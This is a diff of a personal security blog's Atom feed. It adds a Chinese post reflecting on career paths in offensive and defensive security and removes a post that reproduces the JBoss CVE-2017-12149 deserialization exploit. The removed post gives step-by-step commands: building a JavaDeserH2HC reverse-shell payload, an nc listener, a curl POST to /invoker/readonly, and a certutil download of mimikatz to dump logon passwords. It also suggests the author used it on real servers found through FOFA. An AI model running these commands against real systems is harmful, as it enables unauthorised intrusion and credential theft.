@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-02-05T13:01:56.383Z</updated>
+  <updated>2020-02-08T14:11:33.852Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>对于乙方安全职业发展方向的思考</title>
+    <link href="http://sherlocz.github.io/2020/02/08/%E5%AF%B9%E4%BA%8E%E4%B9%99%E6%96%B9%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95%E6%96%B9%E5%90%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
+    <id>http://sherlocz.github.io/2020/02/08/对于乙方安全职业发展方向的思考/</id>
+    <published>2020-02-08T13:05:15.000Z</published>
+    <updated>2020-02-08T14:11:33.852Z</updated>
+    
+    <content type="html"><![CDATA[<p>学了安全一段时间了，也工作了一段时间，接触过很多很多厉害的人，有社工特别厉害的，有APT的大佬，有审计的大佬，有免杀的大佬，也有做黑产的，在这么多方向中其实还并没有找到自己发展的一个方向，其实看啥都想学点，但是总体来说感觉并没有沉淀下来的技术，对于走技术方向的安全从业人员来说，必须得有个自身立足的优势。</p><p>所以这里就结合自己最近半年接触过的一些岗位，面试经历，讲讲我认知中乙方安全技术上发展的几个方向。</p><h1 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h1><h2 id="安全服务"><a href="#安全服务" class="headerlink" title="安全服务"></a>安全服务</h2><p>这是出入安全门槛相对比较低的一个岗位，平时的工作离不开<strong>等级保护、基线核查、渗透测试、网络等</strong>，做的工作内容相对杂一些。</p><p>对技术上的要求并不高，但是你对整个安全市场会有更多的了解，技术上其实你只要能挖挖洞，能讲清楚漏洞原理就OK。技术上的提升是横向的，并不会对某个领域有着过分的要求，就算你哪一块特别的厉害，公司基本上也不会有这样的需求，能够干活就对了。</p><h2 id="红蓝对抗"><a href="#红蓝对抗" class="headerlink" title="红蓝对抗"></a>红蓝对抗</h2><p>红队的工作相对来说其实相当于高级安全服务工程师，或者说是渗透测试工程师，但是没有安全服务那么杂，基本上就是单纯的渗透、拿站、想尽一切办法进行攻击，除去了等级保护以及一些杂七杂八的东西。</p><p>技术上的要求会高很多，你的知识面得足够广，并且在数个或者一个领域有着较为深入的研究和了解，以及一定量项目的经验。在这条方向上你的技能会提升的很多，很快，也是很多安全从业人员向往的工作方向吧。</p><h2 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h2><p>APT就叫做高级可持续威胁攻击，拿到的项目更加的大、复杂，渗透的周期会很长，感觉这个方向都是去做国安的项目，比方说国家投资的一些APT队伍，或者民间的一些自行组织的黑客团队，攻击的都是某个国家的站点、内网、医疗机构、金融机构，大型企业。</p><p>对于技术的要求会更高，而且想要拿下并不容易，可能几个月甚至半年数年都得盯着某个特定的目标，寻找出资产中的脆弱点进行攻击、社会工程攻击等。</p><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><p>主要的工作基本上就是关注0day、攻击事件，但是没有接触过这样的团队，很多小乙方安全公司的安全工程师其实也是兼职这个小方向的。只有大厂才能养活这样的团队。</p><p>第一时间拿到这个情报是很值钱的，帮助企业在安全运营中，利用威胁情报快速检测、响应、分析和预防各类网络攻击威胁，并分析产生行业威胁情报。对于一些被攻击的公司或者潜在的攻击对象来说，市场是很大的。</p><h2 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h2><p>看过很多出来单干的全职挖SRC的高手，有写扫面器发家致富的，也有批量刷SRC的，对于国内一些大厂SRC，其实每年也就那么几个人挖，毕竟奖金会特别的丰厚，也能提高自身的知名度，能够做到这样的人少之甚少，是一个小圈子内进行的项目，毕竟这个方向全职每年少说也能赚几十万呐。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计的语言有很多种，市面上的招聘一般就会招聘PHP、JAVA或者GO于言的工程师，工作也就是进行拿项目进行代码审计，最后产出。</p><p>不过不同的语言他的特性不一样，框架不一样，你所需要花费的时间就会特别多，而且最好是开发转审计，接触过的好几个审计的大牛都是开发出身的。</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>内网渗透也包含在后渗透当中，能够接触到内网渗透的安全人员相对来说少很多，而很多的项目也是直接从内网开始的，公司有了这样的需求肯定要招聘，不过数目也是挺少的。</p><h2 id="安全研究"><a href="#安全研究" class="headerlink" title="安全研究"></a>安全研究</h2><p>安全研究能分成很多块，但是首先得说说产出的问题。<br>对于这样的岗位，只有极少数的互联网大厂和大型的乙方安全公司才有这样的团队，小公司这样的安全研究能力都是扯几把蛋的。当公司预算不足的时候，这样的团队也是首先得裁掉的对象之一。</p><p>除非你是天才，对于安全领域有着超高的悟性或者年少有为，才能去向这个方向发展，否则你研究出来的东西本身就没几个人懂，无法为公司提出那个高的价值，这样的方向我认为是没有意义的，当然要是你能做到，说明你的技术确实非常突出了。</p><p>web方向的研究领域：代码审计、内网渗透、免杀、钓鱼、前端安全、数据库安全等等</p><p>当然也有招代码审计工程师或者内网渗透工程师的，我并没有把它放在安全研究领域，因为这样的岗位依然以输出为主，并非纯粹的安全研究。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然，如上提到的都只是安全领域中的很小一部分，会有一些其他的方向没拿出来说，这些也只是我浅薄认知中认识的乙方安全，对于自身要走的方向或者技能栈，看自身的选择吧，当然要是周围有这样的大牛就直接舔，毕竟安全也是一个很吃情报的行业，很多东西都不会在市面上分享出来呀。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;学了安全一段时间了，也工作了一段时间，接触过很多很多厉害的人，有社工特别厉害的，有APT的大佬，有审计的大佬，有免杀的大佬，也有做黑产的，在这么多方向中其实还并没有找到自己发展的一个方向，其实看啥都想学点，但是总体来说感觉并没有沉淀下来的技术，对于走技术方向的安全从业人员来
+      
+    
+    </summary>
+    
+    
+    
+      <category term="思考" scheme="http://sherlocz.github.io/tags/%E6%80%9D%E8%80%83/"/>
+    
+  </entry>
   
   <entry>
     <title>利用wmi进行横向渗透</title>
@@ -453,29 +477,6 @@
     
     
       <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>JBoss AS 6.X 反序列化漏洞+getshell+实战(CVE-2017-12149)</title>
-    <link href="http://sherlocz.github.io/2019/11/11/JBosS-AS-6-X-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149/"/>
-    <id>http://sherlocz.github.io/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/</id>
-    <published>2019-11-11T04:22:06.000Z</published>
-    <updated>2020-01-13T05:03:30.665Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>CVE编号：CVE-2017-12149<br>影响版本：影响版本为JBoss5.x-6.x<br>漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>(Kali上一直复现不成功，这里我就用了两台ubuntu做实验)<br>攻击目标：192.168.43.131<br>攻击机器：192.168.43.140</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JBOSS 下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</span><br></pre></td></tr></table></figure><p>解压，编辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</span><br></pre></td></tr></table></figure></p><p>设置为允许远程访问<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/xml.png" alt></p><p>用nmap扫描服务器，发现8080端口<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/nmap.png" alt></p><p>访问 <strong><a href="http://192.168.43.131:8080" target="_blank" rel="noopener">http://192.168.43.131:8080</a></strong><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/8080.png" alt><br>长这个样子</p><p>然后访问 <strong>/invoker/readonly</strong> 这个位置<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/invoke.png" alt><br>返回500证明存在漏洞</p><p>首先用java的利用工具验证一下<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/linux.png" alt></p><p>这里可以执行命令了，但是还不能反弹shell</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a><br>下载这个JavaDeserH2HC工具，解压，进入目录下，然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line"></span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap targetip:port</span><br></pre></td></tr></table></figure></p><p>在本地监听端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure></p><p>然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://target:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/shell.png" alt><br>拿到shell</p><p>fofa一下的成果<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/ali.png" alt></p><p>然后发现就是system权限哦，服务器搭建一个apache，上传mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://xxxxx/mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/mimikatz.png" alt><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/3389.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;CVE编号：CVE-2017-12149&lt;br&gt;影响版本：影响版本为JBoss5.x-6.x&lt;br&gt;漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-      <category term="实战" scheme="http://sherlocz.github.io/tags/%E5%AE%9E%E6%88%98/"/>
     
   </entry>
   
